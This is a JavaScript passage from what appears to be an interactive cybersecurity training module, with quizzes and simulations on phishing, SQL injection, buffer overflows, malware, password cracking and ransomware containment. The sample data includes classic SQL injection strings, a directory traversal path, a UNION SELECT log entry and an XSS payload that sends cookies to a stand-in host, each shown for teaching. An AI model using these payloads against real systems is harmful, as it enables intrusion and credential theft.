    $(".caption",el).innerHTML=`<b>${F[k][0]}.</b> ${F[k][2]}${k==="link"&&clicks>=3?' <span class="status-bad">You clicked it three times. In real life, report it instead.</span>':""}`;
    $(".rv-prog",el).textContent=`${found.size} of 6 red flags found`;if(found.size===6){award("viz:phish",30,"Found every phishing red flag");$(".caption",el).innerHTML+='<br><br><span class="status-good">All six found.</span> Report it with the phishing button, don\'t just delete it.'}});
})();

sortViz($("#viz-sesort"),{title:"Name the social engineering technique",bins:{ph:"Phishing family",imp:"Impersonation / pretexting",web:"Web-based lure",inf:"Influence campaign"},
  items:[["Text: \"Your toll is unpaid, pay here\"","ph","Smishing is phishing over SMS."],["Call from \"IT\" asking for your MFA code","imp","Vishing that relies on impersonating IT."],["examp1e-payroll.com login page","web","Typosquatting a look-alike domain."],["Compromised industry news site","web","A watering hole attack."],["Fake CEO email: \"Wire $48,000 today\"","imp","Business email compromise."],["Coordinated fake reviews claiming a product is unsafe","inf","Disinformation spreads false information on purpose."],["Email to the CFO only, naming her assistant","ph","Whaling: spear phishing aimed at an executive."],["Visitor in a hi-vis vest: \"Here to check the fire panel\"","imp","Pretexting with a believable story."]],done:"Named every social engineering technique"});

/* ---- SQL injection sandbox ---- */
(function(){
  const el=$("#viz-sqli");const P=["alice","' OR '1'='1' --","admin' --","x'; DROP TABLE users; --"];const tried=new Set();let safe=false;
  el.innerHTML=`<div class="viz-title">SQL injection sandbox</div><div class="chips">${P.map((p,i)=>`<button class="chip mono" data-p="${i}">${esc(p)}</button>`).join("")}</div>
  <div class="chips" style="margin-top:6px"><button class="chip" data-m="0" aria-pressed="true">String concatenation</button><button class="chip" data-m="1">Parameterized query</button></div>
  <div class="s-small" style="margin-top:10px">QUERY SENT TO THE DATABASE</div><div class="sqlbox" id="sq-q">Pick a username to submit.</div><div class="caption" aria-live="polite"></div>`;
  let cur=null;
  function draw(){if(cur===null)return;const u=P[cur];
    if(!safe){const inj=cur>0;$("#sq-q",el).innerHTML=`SELECT * FROM users WHERE name = '<span class="${inj?"inj":""}">${esc(u)}</span>' AND pw = '••••';`;
      $(".caption",el).innerHTML=[`<span class="status-good">Normal login.</span> The input is just a name.`,`<span class="status-bad">Every row returned.</span> '1'='1' is always true and <span class="mono">--</span> comments out the password check. The attacker is logged in as the first user, often the admin.`,`<span class="status-bad">Logged in as admin with no password.</span> The quote closes the string and <span class="mono">--</span> removes the password check.`,`<span class="status-bad">Users table deleted.</span> Stacked queries let the attacker run any SQL.`][cur]}
    else{$("#sq-q",el).innerHTML=`SELECT * FROM users WHERE name = <b>?</b> AND pw = <b>?</b>;<br><span class="s-small">PARAMETER 1 =</span> "${esc(u)}"`;
      $(".caption",el).innerHTML=cur===0?'<span class="status-good">Normal login.</span>':`<span class="status-good">Attack failed.</span> The database looks for a user literally named <span class="mono">${esc(u)}</span>. Input is always data, never code.`}
    tried.add((safe?"s":"u")+cur);if([0,1,2,3].every(i=>tried.has("u"+i))&&[1,2,3].some(i=>tried.has("s"+i)))award("viz:sqli",30,"Broke and fixed a SQL query")}
  el.addEventListener("click",e=>{const p=e.target.closest("[data-p]"),m=e.target.closest("[data-m]");if(p){cur=+p.dataset.p;el.querySelectorAll("[data-p]").forEach(x=>x.setAttribute("aria-pressed",x===p))}
    if(m){safe=m.dataset.m==="1";el.querySelectorAll("[data-m]").forEach(x=>x.setAttribute("aria-pressed",x===m))}draw()});
})();

/* ---- buffer overflow stack ---- */
(function(){
  const el=$("#viz-bof");let n=0,prot=false;const seen=new Set();
  el.innerHTML=`<div class="viz-title">Buffer overflow: fill a 16-byte buffer</div>
  <div class="rng-row"><span>Input length</span><input type="range" min="0" max="40" value="0" aria-label="Input length"><b id="bf-n">0 B</b></div>
  <div class="chips"><button class="chip" data-p="0" aria-pressed="true">No bounds checking</button><button class="chip" data-p="1">Bounds checking + ASLR/DEP</button></div>
  <div class="stack-mem" id="bf-s"></div><div class="caption" aria-live="polite"></div>`;
  function draw(){const take=prot?Math.min(n,16):n;$("#bf-n",el).textContent=n+" B";
    const buf="A".repeat(Math.min(take,16)).padEnd(16,"·"),fp=take>16?"A".repeat(Math.min(take-16,8)).padEnd(8,"·"):"0x7ffe8a10",ret=take>24?("A".repeat(Math.min(take-24,8))+"").padEnd(8,"·"):"0x00401a2c";
    $("#bf-s",el).innerHTML=`<div class="buf"><span>buffer[16]</span><b>${buf}</b></div><div class="${take>16?"over":""}"><span>saved frame ptr</span><b>${fp}</b></div><div class="ret ${take>24?"over":""}"><span>return address</span><b>${take>24?(take>=32?"0x41414141 → attacker code":ret):ret}</b></div>`;
    let t;if(prot&&n>16)t='<span class="status-good">Input truncated at 16 bytes.</span> Bounds checking stops the overflow, and ASLR and DEP would make any leftover bug hard to exploit.';
    else if(take<=16)t="The input fits in the buffer. Nothing else is touched.";
    else if(take<=24)t='<span class="status-bad">Overflow.</span> Extra bytes spill into the saved frame pointer. The program will probably crash (a denial of service).';
    else t='<span class="status-bad">Return address overwritten.</span> When the function returns, the CPU jumps wherever the attacker chose. That\'s code execution.';
    $(".caption",el).innerHTML=t;if(!prot&&take>=32)seen.add("pwn");if(prot&&n>16)seen.add("fix");if(seen.size===2)award("viz:bof",30,"Overflowed and protected a buffer")}
  $("input",el).addEventListener("input",e=>{n=+e.target.value;draw()});
  el.addEventListener("click",e=>{const p=e.target.closest("[data-p]");if(!p)return;prot=p.dataset.p==="1";el.querySelectorAll("[data-p]").forEach(x=>x.setAttribute("aria-pressed",x===p));draw()});draw();
})();

revealViz($("#viz-vulns"),{title:"Vulnerability field guide",cols:4,done:"Reviewed every vulnerability type",items:[
  ["Unpatched OS","Operating system","Most breaches use known flaws with patches available. Patch management is the fix.","atk"],["Firmware flaw","Hardware","Bugs below the OS, in BIOS/UEFI or device firmware. Hard to detect, and updates are often neglected.","atk"],["End-of-life device","Hardware","The vendor stopped patching. Every new flaw stays open forever. Replace or isolate it.","atk"],["VM escape","Virtualization","Code in a guest VM breaks out to the hypervisor and can reach every other VM on the host.","atk"],
  ["Resource reuse","Virtualization","Memory or disk given to a new VM still holds the previous tenant's data.","atk"],["Open storage bucket","Cloud","Misconfigured permissions expose files to the whole internet.","atk"],["Compromised vendor","Supply chain","A trusted software update, hardware part or service provider carries the attack in.","atk"],["Weak cipher","Cryptographic","Old protocols (SSL, TLS 1.0) or weak keys let attackers decrypt or forge traffic.","atk"],
  ["Default password","Misconfiguration","Factory credentials are published online. Attackers scan for them constantly.","atk"],["Side loading","Mobile","Apps from outside the official store skip vetting and can carry malware.","atk"],["Jailbreak / root","Mobile","Removes the OS sandbox and security controls. MDM should block these devices.","atk"],["Zero-day","Unknown","No patch and no signature. Defense in depth and behavior-based detection are your best bets.","atk"]]});

revealViz($("#viz-malware"),{title:"Malware family explorer",cols:4,done:"Explored every malware family",items:[
  ["Ransomware","Extortion","Encrypts files and demands payment, often after stealing a copy. Offline backups are the key defense.","atk"],["Trojan","Disguise","Looks like a useful program. Delivers a payload once run.","atk"],["RAT","Remote control","A Trojan that opens a backdoor for the attacker to control the host.","atk"],["Worm","Self-spreading","Exploits network services to jump host to host with no user action.","atk"],
  ["Virus","Needs a host","Attaches to files or boot sectors and spreads when users run them.","atk"],["Spyware","Surveillance","Collects browsing, keystrokes or screenshots and sends them out.","atk"],["Keylogger","Surveillance","Captures every keystroke, including passwords. Can be software or a USB dongle.","atk"],["Logic bomb","Time delay","Sits dormant until a date or event triggers it.","atk"],
  ["Rootkit","Stealth","Runs at kernel or firmware level and hides itself and other malware from the OS.","atk"],["Fileless","Stealth","Lives in memory and uses PowerShell or WMI. Leaves little for antivirus to scan.","atk"],["Bloatware","Unwanted","Preinstalled apps nobody asked for. More software means more attack surface.","atk"],["Botnet agent","Zombie","Turns the device into a bot that takes orders from a command-and-control server.","atk"]]});

quizViz($("#viz-malid"),{title:"Identify the malware",done:"Identified every malware sample",qs:[
  ["After a user runs a \"free game\", an attacker can see their screen and control the mouse.",["RAT","Worm","Logic bomb"],0,"A remote access Trojan."],
  ["Overnight, 400 unpatched servers are infected through an SMB flaw. Nobody clicked anything.",["Virus","Worm","Spyware"],1,"Spreading on its own through a network service is a worm."],
  ["Antivirus finds nothing, but Task Manager doesn't list a process that's clearly using the network.",["Rootkit","Bloatware","Keylogger"],0,"Rootkits hide processes from the OS."],
  ["A new laptop ships with six trial apps and a toolbar.",["Bloatware","Spyware","Trojan"],0,"Unwanted preinstalled software is bloatware."],
  ["A PowerShell command in a scheduled task downloads and runs code in memory every hour.",["Fileless malware","Virus","Logic bomb"],0,"Fileless malware abuses built-in tools."],
  ["On April 1, a script deletes the accounting database.",["Logic bomb","Worm","RAT"],0,"A date trigger is classic logic bomb behavior."]]});

/* ---- password attack lab ---- */
(function(){
  const el=$("#viz-pwlab");
  const DICT=["password","123456","qwerty","letmein","welcome","dragon","monkey","summer2024","winter2025","iloveyou","admin","football"];
  const GUESS=1e10;/* offline GPU guesses per second against a fast hash */
  el.innerHTML=`<div class="viz-title">Password attack lab</div><input class="txt-in" id="pw-in" value="summer2024" aria-label="Password to test" autocomplete="off">
  <div class="chips" style="margin-top:8px"><button class="chip" data-h="fast" aria-pressed="true">Stored as fast hash (MD5)</button><button class="chip" data-h="slow">Stored as bcrypt (slow)</button></div>
  <div class="kv" id="pw-kv"></div><div class="meter"><i id="pw-m"></i></div><div class="caption" aria-live="polite"></div>
  <div class="viz-controls"><button class="btn primary" data-a="crack">Run the attack</button></div>`;
  let slow=false,ran=new Set();
  const space=p=>{let s=0;if(/[a-z]/.test(p))s+=26;if(/[A-Z]/.test(p))s+=26;if(/[0-9]/.test(p))s+=10;if(/[^a-zA-Z0-9]/.test(p))s+=33;return s||1};
  const human=s=>s<1?"instantly":s<60?Math.round(s)+" seconds":s<3600?Math.round(s/60)+" minutes":s<86400?Math.round(s/3600)+" hours":s<3.15e7?Math.round(s/86400)+" days":s<3.15e9?Math.round(s/3.15e7)+" years":s<3.15e13?Math.round(s/3.15e9)+" centuries":"longer than the universe has existed";
  function calc(){const p=$("#pw-in",el).value,rate=slow?GUESS/1e6:GUESS,inDict=DICT.includes(p.toLowerCase())||/^[a-z]+\d{1,4}!?$/i.test(p)&&p.length<=12;
    const bf=Math.pow(space(p),p.length)/rate/2;return {p,inDict,bf,rate}}
  function draw(r){const c=calc();
    $("#pw-kv",el).innerHTML=`<span>Length</span><b>${c.p.length} characters</b><span>Character set</span><b>${space(c.p)} symbols</b><span>Brute force</span><b>${human(c.bf)}</b><span>Dictionary + rules</span><b class="${c.inDict?"status-bad":""}">${c.inDict?"cracked in under a second":"not in the wordlist"}</b>`;
    const sc=c.inDict?2:Math.min(100,Math.log10(c.bf+1)*7);$("#pw-m",el).style.width=(100-sc)+"%";
    if(r){const t=c.inDict?0:c.bf;if(t<3600){$(".caption",el).innerHTML=`<span class="status-bad">Cracked ${human(t)}.</span> ${c.inDict?"It's a common word plus digits, so the dictionary attack's rules found it at once.":"It's too short for its character set."}`;flag("cracked");ran.add("weak")}
      else{$(".caption",el).innerHTML=`<span class="status-good">Survived.</span> Estimated brute-force time: ${human(t)}. ${slow?"bcrypt makes each guess about a million times slower.":"Length beats complexity: a long passphrase is the strongest choice."}`;ran.add("strong")}
      if(slow)ran.add("slow");if(ran.has("weak")&&ran.has("strong")&&ran.has("slow"))award("viz:pwlab",30,"Ran the password attack lab")}
    else $(".caption",el).innerHTML=`Offline attack at ${slow?"10,000":"10 billion"} guesses per second. Try a weak password, then a long passphrase, and compare hashing methods.`}
  $("#pw-in",el).addEventListener("input",()=>draw(false));
  el.addEventListener("click",e=>{const h=e.target.closest("[data-h]");if(h){slow=h.dataset.h==="slow";el.querySelectorAll("[data-h]").forEach(x=>x.setAttribute("aria-pressed",x===h));draw(false)}
    if(e.target.closest('[data-a="crack"]')){draw(true);if(!ran.has("strong")&&ran.has("weak"))$(".caption",el).innerHTML+=' Now try something like <span class="mono">correct-horse-battery-staple</span>.'}});
  draw(false);
})();

quizViz($("#viz-iocq"),{title:"Read the log: which IoC is it?",done:"Spotted every indicator of compromise",qs:[
  ["<span class='mono'>09:02 jsmith login OK  IP 73.12.4.9  (Denver)<br>09:09 jsmith login OK  IP 185.220.101.4  (Frankfurt)</span>",["Impossible travel","Account lockout","Missing logs"],0,"Seven minutes between Denver and Frankfurt."],
  ["<span class='mono'>Event 4740: account locked out ×38 accounts in 4 minutes</span>",["Password spraying / guessing","Resource inaccessibility","Out-of-cycle logging"],0,"Mass lockouts mean someone is guessing passwords across accounts."],
  ["<span class='mono'>FS01 · CPU 98% · outbound 4.1 GB to 45.9.20.11 · 02:14</span>",["Resource consumption","Concurrent sessions","Blocked content"],0,"Unexplained CPU and bandwidth at 2 a.m. suggests exfiltration or mining."],
  ["<span class='mono'>Security log: 01:00 … [no entries] … 04:10 Event 1102 log cleared</span>",["Missing logs","Impossible travel","Account lockout"],0,"Event 1102 means someone cleared the log. Attackers cover their tracks."],
  ["<span class='mono'>Help desk: 23 users can't open files on S:\\ (extension .crypt)</span>",["Resource inaccessibility","Resource consumption","Published data"],0,"Suddenly unusable files are a ransomware indicator."],
  ["<span class='mono'>VPN: user tlee active from 10.8.0.14 and 10.8.0.92 simultaneously</span>",["Concurrent session usage","Impossible travel","Blocked content"],0,"One person, two simultaneous sessions: credentials may be shared or stolen."]]});

/* ---- ransomware outbreak / segmentation lab ---- */
(function(){
  const el=$("#viz-outbreak");
  const H=[["PC-01","Sales"],["PC-02","Sales"],["PC-03","Sales"],["PC-04","Sales"],["HR-01","HR"],["HR-02","HR"],["FS-01","Servers"],["DB-01","Servers"]];
  const zone=i=>i<4?0:i<6?1:2;let seg=false,patched=false,inf=new Set(),t=null,runs=new Set();
  el.innerHTML=`<div class="viz-title">Ransomware outbreak: what stops the spread?</div>
  <div class="chips"><button class="chip" data-o="seg">Segment the network</button><button class="chip" data-o="patch">Patch SMB on all hosts</button></div>
  <div class="grid-net" id="ob-g"></div><div class="caption" aria-live="polite">PC-01 will open a malicious attachment. Choose your mitigations, then release the worm.</div>
  <div class="viz-controls"><button class="btn primary" data-a="go">Release the worm</button><button class="btn" data-a="reset">Reset</button></div>`;
  function draw(){el.querySelectorAll("[data-o]").forEach(b=>b.setAttribute("aria-pressed",b.dataset.o==="seg"?seg:patched));
    $("#ob-g",el).innerHTML=H.map((h,i)=>`${seg&&(i===4||i===6)?'<div class="zone-sep"></div>':""}<button class="${inf.has(i)?"inf":""} ${i===0&&inf.has(0)?"pz":""}" tabindex="-1"><b>${h[0]}</b><span class="s-small">${inf.has(i)?"ENCRYPTED":h[1]}</span></button>`).join("")}
  function go(){clearInterval(t);inf=new Set([0]);draw();let step=0;
    t=setInterval(()=>{step++;const add=[];inf.forEach(i=>H.forEach((_,j)=>{if(inf.has(j))return;if(seg&&zone(j)!==zone(i))return;if(patched)return;add.push(j)}));
      add.slice(0,2).forEach(j=>inf.add(j));draw();
      if(!add.length||step>8){clearInterval(t);const n=inf.size;
        let msg;if(n===8){msg='<span class="status-bad">Every host encrypted, including the file server and database.</span> On a flat network the worm reaches everything.';flag("outbreak");runs.add("flat")}
        else if(n===1){msg=`<span class="status-good">Contained to PC-01.</span> ${patched?"With SMB patched, the worm has no way to spread. Only the user who opened the file is hit.":""}`;runs.add("ok")}
        else{msg=`<span class="status-good">Contained to the Sales segment.</span> ${n} of 8 hosts lost, but HR and the servers are safe behind the firewall between zones.`;runs.add("ok")}
        $(".caption",el).innerHTML=msg+(runs.has("flat")&&runs.has("ok")?" Segmentation limits the blast radius; patching removes the path entirely. Use both.":"");
        if(runs.has("ok")&&(seg||patched))award("viz:outbreak",30,"Contained a ransomware outbreak")}},REDUCED?60:450)}
  el.addEventListener("click",e=>{const o=e.target.closest("[data-o]"),a=e.target.closest("[data-a]")?.dataset.a;
    if(o){if(o.dataset.o==="seg")seg=!seg;else patched=!patched;inf.clear();clearInterval(t);draw()}if(a==="go")go();if(a==="reset"){clearInterval(t);inf.clear();draw()}});draw();
})();
  },
  sims:[
    {id:"inbox",title:"Triage the suspicious inbox",type:"choice",
      scenario:"You're the security analyst on shift. Five messages were reported by staff this morning. Decide what each one is.",
      steps:[
        ["From: payroll@yourc0mpany.com · \"Updated direct deposit form, sign by noon\" with a .docm attachment.",["Legitimate HR email","Phishing: typosquatted domain and macro-enabled attachment","Spam, ignore it","Smishing"],1,"Look-alike domain plus a macro document and a deadline: phishing."],
        ["Text to the CEO: \"This is your IT team. Reply with the code we just sent you to stop the lockout.\"",["Smishing aimed at MFA codes","Legitimate IT request","Vishing","Watering hole"],0,"SMS attempt to steal an MFA code. IT never asks for codes."],
        ["Email from your real vendor's real mailbox: \"Our bank changed. Please send all future payments to this new account.\"",["Safe because the sender is real","Possible business email compromise; verify by phone using a known number","Typosquatting","Spam"],1,"Compromised vendor mailboxes are classic BEC. Verify out of band."],
        ["Calendar invite from your manager for the weekly 1:1, same as every week.",["Phishing","Legitimate","Whaling","Pretexting"],1,"Expected, from the known sender, nothing unusual. Not everything is an attack."],
        ["Several engineers report malware alerts after visiting a popular open-source project's documentation site.",["Watering hole","Spear phishing","Insider threat","Brand impersonation"],0,"Attackers compromised a site the target group visits."]],
      success:"Inbox triaged. Report, verify out of band, and don't let urgency rush you."},
    {id:"iocmatch",type:"match",title:"Match the evidence to the attack",
      scenario:"The incident response team pulled six pieces of evidence. Match each one to the attack it points to.",
      items:[["SQL injection","sqli"],["Password spraying","spray"],["Credential stuffing","stuff"],["Directory traversal","trav"],["Cross-site scripting","xss"],["Downgrade attack","down"]],
      slots:[["sqli","Web log 1","GET /item?id=7%20UNION%20SELECT%20username,password%20FROM%20users"],["spray","Auth log","One failed login each for 2,300 different accounts, same password, then silence for 30 min"],["stuff","Auth log","Logins using exact email/password pairs from a 2023 breach of another site"],["trav","Web log 2","GET /download?file=../../../../windows/win.ini"],["xss","Web log 3","POST /comment body=&lt;script&gt;fetch('//evil.io?c='+document.cookie)&lt;/script&gt;"],["down","TLS log","Client and server negotiated SSL 3.0 after the handshake was tampered with"]],
      success:"Six for six. Logs tell the story if you know the patterns."},
    {id:"hardenweb",type:"check",title:"Fix the vulnerable web app",
      scenario:"A pen test found SQL injection, stored XSS and directory traversal in the customer portal. Select every change that fixes or reduces these findings, and nothing else.",
      opts:[["Use parameterized queries for all database access",1],["Validate input on the server against an allow list of expected characters",1],["Encode output before rendering user content in HTML",1],["Resolve file paths and reject anything outside the downloads folder",1],["Put a web application firewall in front as an extra layer",1],["Rely on JavaScript validation in the browser only",0],["Hide error messages by changing the font color to white",0],["Run the database service as a domain administrator",0],["Rename the login page to make it harder to find",0]],
      success:"Fixed at the source, with a WAF as defense in depth. Client-side checks alone never count, because attackers bypass the browser."},
    {id:"mitig",type:"match",title:"Choose the mitigation",
      scenario:"Six risks came out of the quarterly review. Match each one to the mitigation that addresses it best.",
      items:[["Segmentation","seg"],["Application allow list","allow"],["Patching","patch"],["Isolation","iso"],["Decommissioning","decom"],["Change default passwords","pw"]],
      slots:[["seg","Risk 1","A worm on one floor could reach the payment servers"],["allow","Risk 2","Kiosk users keep running unapproved executables from USB"],["patch","Risk 3","A known critical flaw in the VPN appliance has a vendor fix"],["iso","Risk 4","A workstation is beaconing to a C2 server right now"],["decom","Risk 5","Twelve old servers from a closed project are still online"],["pw","Risk 6","New IP cameras still use admin/admin"]],
      success:"Each risk gets the mitigation that fits. The exam rewards picking the most direct fix."}
  ],
  badges:[
    ["reader","TI","Threat Intel","Mark all 9 threats lessons studied",c=>c.allStudied()],
    ["lab","RL","Red Lab","Complete all 12 diagrams in this module",c=>c.vizAll()],
    ["phish","PF","Phish Fryer","Find every red flag in the phishing inspector",c=>c.earned("viz:phish")],
    ["sqli","SQ","Little Bobby Tables","Break and then fix the SQL injection sandbox",c=>c.earned("viz:sqli")],
    ["contain","CT","Containment","Stop the ransomware outbreak with mitigations",c=>c.earned("viz:outbreak")],
    ["triage","TR","Inbox Zero","Pass the inbox triage simulation",c=>c.passed("inbox")],
    ["patch","WP","Web Patcher","Pass the vulnerable web app simulation",c=>c.passed("hardenweb")],
    ["perfect","AP","Apex Predator","Score 100% on a threats quiz of 15+ questions",c=>c.earned("quiz100")]
  ]
});
})();
